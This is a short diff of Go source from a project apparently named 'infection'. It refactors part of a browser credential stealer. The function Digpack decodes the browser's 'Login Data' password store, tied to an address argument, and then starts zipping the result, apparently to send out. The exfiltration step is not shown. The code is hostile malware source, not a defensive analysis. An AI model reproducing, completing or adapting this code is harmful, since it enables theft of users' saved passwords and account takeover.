@@ -5,7 +5,6 @@ import (
 	"bytes"
 	"fmt"
 	"infection/util/lib"
-	"infection/util/lib/dew32"
 	"io"
 	"io/ioutil"
 	"log"
@@ -16,7 +15,7 @@ import (
 	"time"
 )
 
-var Safe_path = get_current_user() + "\\tmp\\"
+var Safe_path = lib.BrowserSafepath
 
 type Msg struct {
 	Hostid string `json:"hostid"`
@@ -62,7 +61,7 @@ func Digpack(addr string) {
 		if berr != nil {
 			return
 		}
-		dew32.DeCode(Safe_path+"Login Data", addr)
+		lib.DeCode(Safe_path+"Login Data", addr)
 		time.Sleep(2 * time.Second)
 		buf := new(bytes.Buffer)
 		w := zip.NewWriter(buf)
